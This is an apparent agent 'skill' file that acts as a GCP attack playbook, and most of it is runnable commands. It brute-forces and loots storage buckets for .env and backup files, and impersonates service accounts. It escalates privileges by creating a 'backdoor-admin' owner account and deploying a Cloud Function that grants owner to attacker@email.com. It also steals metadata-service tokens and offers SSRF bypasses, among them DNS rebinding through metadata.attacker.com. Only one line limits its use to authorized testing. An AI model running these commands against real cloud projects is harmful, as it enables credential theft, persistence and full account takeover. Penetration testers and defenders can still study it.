---
name: gcp-security
description: Google Cloud Platform security testing - GCS bucket misconfigurations, IAM privilege escalation, service account attacks, metadata service exploitation
---

# GCP Security Testing

## Cloud Storage (GCS) Bucket Enumeration

### Discover GCS Buckets
```bash
# Install Google Cloud SDK
curl https://sdk.cloud.google.com | bash
gcloud init

# List buckets (if authenticated)
gsutil ls

# Brute force bucket names
# Pattern: bucket-name.storage.googleapis.com or storage.googleapis.com/bucket-name
for bucket in target-backup target-data target-logs target-assets; do
  curl -I https://storage.googleapis.com/$bucket 2>/dev/null | grep -E "HTTP|x-goog"
done

# Use tools like gcpbucketbrute
# https://github.com/RhinoSecurityLabs/GCPBucketBrute
python3 gcpbucketbrute.py -k API_KEY -b bucket-name
```

### Test for Public Access
```bash
# Check if bucket is publicly readable
curl -s https://storage.googleapis.com/bucket-name/ | head -20

# Check for listing permission
curl -s https://storage.googleapis.com/storage/v1/b/bucket-name/o

# Check specific objects
curl -I https://storage.googleapis.com/bucket-name/sensitive-file.txt

# Test for public write (authorized testing only)
echo "test" > test.txt
gsutil cp test.txt gs://bucket-name/test.txt
```

### GCS Bucket Misconfigurations

**Public Read Access**
```bash
# List all objects in public bucket
gsutil ls -r gs://bucket-name/**

# Download sensitive files
gsutil cp gs://bucket-name/config.json .
gsutil cp gs://bucket-name/backup.sql .
gsutil cp gs://bucket-name/.env .

# Use curl for unauthenticated access
curl -s https://storage.googleapis.com/bucket-name/config.json
```

**IAM Policy Misconfiguration**
```bash
# Get bucket IAM policy
gsutil iam get gs://bucket-name

# Look for:
# - "allUsers" or "allAuthenticatedUsers" in members
# - roles/storage.objectAdmin or roles/storage.admin
# - Overly permissive bindings

# Example vulnerable policy:
{
  "bindings": [
    {
      "members": ["allUsers"],
      "role": "roles/storage.objectViewer"
    }
  ]
}
```

**Uniform Bucket-Level Access Disabled**
```bash
# Check if uniform access is enabled
gsutil uniformbucketlevelaccess get gs://bucket-name

# If disabled, object-level ACLs are in effect
# Check object ACLs
gsutil acl get gs://bucket-name/sensitive-file.txt

# Look for:
# - "allUsers" or "allAuthenticatedUsers"
# - WRITE or OWNER permissions
```

### GCS Data Exfiltration

**Sensitive Data Discovery**
```bash
# Search for sensitive patterns
gsutil ls -r gs://bucket-name/** | grep -iE "(password|secret|key|token|credential|backup|dump|config)"

# Download and search contents
gsutil -m cp -r gs://bucket-name/ ./bucket-data/
grep -r "password\|secret\|api_key\|token\|BEGIN RSA" ./bucket-data/
```

**Versioned Bucket Exploitation**
```bash
# List all versions (if versioning enabled)
gsutil ls -a gs://bucket-name/

# Download specific version
gsutil cp gs://bucket-name/file.txt#1234567890 .

# Restore archived/deleted objects
gsutil cp gs://bucket-name/deleted-file.txt#VERSION .
```

## IAM & Service Account Attacks

### Service Account Enumeration
```bash
# List service accounts
gcloud iam service-accounts list

# Get service account details
gcloud iam service-accounts describe SERVICE_ACCOUNT_EMAIL

# List service account keys
gcloud iam service-accounts keys list --iam-account SERVICE_ACCOUNT_EMAIL

# Get IAM policy for service account
gcloud iam service-accounts get-iam-policy SERVICE_ACCOUNT_EMAIL
```

### Service Account Key Abuse

**Leaked Service Account Key**
```bash
# If you find a service account key (JSON file)
# Authenticate with the key
export GOOGLE_APPLICATION_CREDENTIALS="/path/to/key.json"
gcloud auth activate-service-account --key-file=/path/to/key.json

# Check identity
gcloud auth list
gcloud config get-value account

# Enumerate permissions
gcloud projects get-iam-policy PROJECT_ID
gsutil ls
gcloud compute instances list
```

**Service Account Impersonation**
```bash
# If you have iam.serviceAccountTokenCreator permission
gcloud auth print-access-token \
  --impersonate-service-account=SERVICE_ACCOUNT_EMAIL

# Use the token
export ACCESS_TOKEN=$(gcloud auth print-access-token --impersonate-service-account=SERVICE_ACCOUNT_EMAIL)
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://storage.googleapis.com/storage/v1/b/bucket-name/o
```

### IAM Privilege Escalation

**Create New Service Account with Admin Role**
```bash
# If you have iam.serviceAccounts.create and iam.serviceAccounts.setIamPolicy
gcloud iam service-accounts create backdoor-admin \
  --display-name="Backdoor Admin"

gcloud projects add-iam-policy-binding PROJECT_ID \
  --member="serviceAccount:backdoor-admin@PROJECT_ID.iam.gserviceaccount.com" \
  --role="roles/owner"

# Create key for new service account
gcloud iam service-accounts keys create key.json \
  --iam-account=backdoor-admin@PROJECT_ID.iam.gserviceaccount.com
```

**Set IAM Policy on Service Account**
```bash
# If you have iam.serviceAccounts.setIamPolicy
# Grant yourself token creator role
gcloud iam service-accounts add-iam-policy-binding \
  TARGET_SERVICE_ACCOUNT_EMAIL \
  --member="user:YOUR_EMAIL" \
  --role="roles/iam.serviceAccountTokenCreator"

# Now impersonate the service account
gcloud auth print-access-token \
  --impersonate-service-account=TARGET_SERVICE_ACCOUNT_EMAIL
```

**Deploy Cloud Function with Admin Role**
```bash
# If you have cloudfunctions.functions.create and iam.serviceAccounts.actAs
# Create function with admin service account
cat > main.py << 'EOF'
def escalate(request):
    import subprocess
    result = subprocess.run(['gcloud', 'projects', 'add-iam-policy-binding', 
                            'PROJECT_ID', 
                            '--member=user:attacker@email.com',
                            '--role=roles/owner'],
                           capture_output=True, text=True)
    return result.stdout
EOF

gcloud functions deploy escalation \
  --runtime python39 \
  --trigger-http \
  --service-account=admin-service-account@PROJECT_ID.iam.gserviceaccount.com \
  --entry-point=escalate

# Invoke function
curl https://REGION-PROJECT_ID.cloudfunctions.net/escalation
```

## Compute Engine Metadata Service

### Metadata Service Access
```bash
# If you have SSRF or shell access to GCE instance
# Access metadata service
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/

# Get service account credentials
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Response includes access token:
# {
#   "access_token": "ya29.c...",
#   "expires_in": 3599,
#   "token_type": "Bearer"
# }

# Use the token
export TOKEN="ya29.c..."
curl -H "Authorization: Bearer $TOKEN" \
  https://storage.googleapis.com/storage/v1/b
```

### Metadata Service Data Extraction
```bash
# Extract all metadata
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/?recursive=true

# Get project ID
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/project/project-id

# Get instance details
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/

# Get custom metadata (may contain secrets)
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/attributes/

# Get startup script (may contain secrets)
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script
```

### SSRF to Metadata Service
```bash
# Test for SSRF vulnerabilities
curl "https://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/?recursive=true" \
  -H "Metadata-Flavor: Google"

# Bypass techniques
curl "https://target.com/fetch?url=http://169.254.169.254/computeMetadata/v1/"
curl "https://target.com/fetch?url=http://metadata.goog/computeMetadata/v1/"
curl "https://target.com/fetch?url=http://0x9fca80fe/computeMetadata/v1/"

# DNS rebinding
# Create DNS record: metadata.attacker.com -> 169.254.169.254
curl "https://target.com/fetch?url=http://metadata.attacker.com/computeMetadata/v1/" \
  -H "Metadata-Flavor: Google"
```

## Cloud SQL & Database Attacks

### Cloud SQL Enumeration
```bash
# List Cloud SQL instances
gcloud sql instances list

# Get instance details
gcloud sql instances describe INSTANCE_NAME

# List databases
gcloud sql databases list --instance=INSTANCE_NAME

# List users
gcloud sql users list --instance=INSTANCE_NAME
```

### Cloud SQL Access
```bash
# If you have cloudsql.instances.connect permission
# Connect to instance
gcloud sql connect INSTANCE_NAME --user=root

# If public IP is enabled
mysql -h INSTANCE_PUBLIC_IP -u root -p

# Check for public IP
gcloud sql instances describe INSTANCE_NAME | grep ipAddress
```

## Testing Checklist

- [ ] Enumerate GCS buckets (DNS, brute force, gsutil)
- [ ] Test GCS buckets for public read/write access
- [ ] Check GCS bucket IAM policies for misconfigurations
- [ ] Check for uniform bucket-level access disabled
- [ ] Search GCS buckets for sensitive data
- [ ] Test versioned buckets for deleted object access
- [ ] Enumerate service accounts and keys
- [ ] Test for service account key abuse
- [ ] Test for service account impersonation
- [ ] Test IAM privilege escalation paths
- [ ] Test Compute Engine metadata service access
- [ ] Test for SSRF to metadata service
- [ ] Extract service account credentials from metadata
- [ ] Enumerate Cloud SQL instances
- [ ] Test Cloud SQL for public IP exposure
- [ ] Check for overly permissive IAM roles

## Tools

```bash
# Google Cloud SDK
curl https://sdk.cloud.google.com | bash

# GCPBucketBrute
# https://github.com/RhinoSecurityLabs/GCPBucketBrute

# GCP IAM privileges tool
# https://github.com/marcin-kolda/gcp-iam-collector

# Cartography (GCP enumeration)
# https://github.com/lyft/cartography

# Nuclei templates for GCP
nuclei -u https://target.com -t ~/nuclei-templates/misconfiguration/gcp/
```

## Real-World Impact

**Case 1: Public GCS Bucket with Source Code**
- Bucket: company-source.storage.googleapis.com
- Contents: Git repository with hardcoded credentials
- Impact: Full infrastructure compromise

**Case 2: Service Account Key in Public Repo**
- Finding: Service account JSON key in GitHub
- Permissions: roles/editor on production project
- Impact: Complete GCP project takeover

**Case 3: Metadata Service SSRF**
- Vulnerability: SSRF in web application on GCE
- Exploitation: Extracted service account token from metadata
- Impact: Accessed Cloud Storage and BigQuery with service account permissions
